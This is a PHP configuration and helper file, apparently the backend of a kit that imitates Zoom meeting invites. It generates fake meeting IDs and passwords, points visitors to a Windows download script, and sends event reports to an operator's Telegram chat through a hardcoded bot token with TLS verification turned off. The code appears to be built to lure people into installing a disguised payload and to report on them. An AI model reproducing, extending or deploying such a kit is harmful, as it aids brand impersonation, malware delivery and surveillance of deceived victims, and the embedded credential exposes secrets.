<?php
// ── Global Config ─────────────────────────────────────────────────────────────
define('ADMIN_PASS', 'Admin@2026');   // ← CHANGE THIS before uploading!
define('ADMIN_KEY',  'zm_adm_' . md5(__FILE__));

// ── Auto-detect base URL (works with any document root, no hardcoded /htdocs/) ─
$_zm_dr     = rtrim(str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'] ?? '') ?: ''), '/');
$_zm_me     = rtrim(str_replace('\\', '/', __DIR__), '/');
// Relative path of this directory from document root, e.g. /zoom-real-invite
$_zm_base   = $_zm_dr ? ('/' . ltrim(str_replace($_zm_dr, '', $_zm_me), '/')) : '/zoom-real-invite';
// Parent of zoom-real-invite, e.g. '' (root) or '/htdocs'
$_zm_parent = rtrim(str_replace('\\', '/', dirname($_zm_base)), '/');
if ($_zm_parent === '.') $_zm_parent = '';
$_zm_scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$_zm_host   = $_SERVER['HTTP_HOST'] ?? 'localhost';

define('SITE_URL',     $_zm_scheme . '://' . $_zm_host . $_zm_base);
define('DOWNLOAD_URL', $_zm_parent . '/Windows/download.php');
unset($_zm_dr, $_zm_me, $_zm_base, $_zm_parent, $_zm_scheme, $_zm_host);

// Telegram (from existing setup)
define('TG_TOKEN',   '7773179943:AAFCNJvidMHSRCT2D1IQXg2PiPC9pQXHwzicU');
define('TG_CHAT_ID', '217706173556');

// Data paths
define('DATA_DIR',     __DIR__ . '/data');
define('MEET_DIR',     DATA_DIR . '/meetings');
define('SIG_DIR',      DATA_DIR . '/signals');
define('EVT_DIR',      DATA_DIR . '/events');

foreach ([MEET_DIR, SIG_DIR, EVT_DIR] as $d) {
    if (!is_dir($d)) @mkdir($d, 0755, true);
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function zm_meeting_id() {
    return rand(100,999) . '-' . rand(100,999) . '-' . rand(1000,9999);
}
function zm_password() {
    return substr(str_shuffle('abcdefghjkmnpqrstuvwxyz23456789'), 0, 8);
}
function zm_load($file) {
    if (!file_exists($file)) return [];
    return json_decode(file_get_contents($file), true) ?? [];
}
function zm_save($file, $data) {
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}
function zm_meet_file($id) {
    return MEET_DIR . '/' . preg_replace('/[^0-9\-]/', '', $id) . '.json';
}
function zm_sig_file($id) {
    return SIG_DIR  . '/' . preg_replace('/[^0-9\-]/', '', $id) . '.json';
}
function zm_evt_file($id) {
    return EVT_DIR  . '/' . preg_replace('/[^0-9\-]/', '', $id) . '.json';
}
function zm_admin_ok() {
    session_start();
    return !empty($_SESSION[ADMIN_KEY]);
}
function tg_send($msg) {
    $ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(['chat_id'=>TG_CHAT_ID,'text'=>$msg,'parse_mode'=>'HTML']),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    @curl_exec($ch);
    curl_close($ch);
}
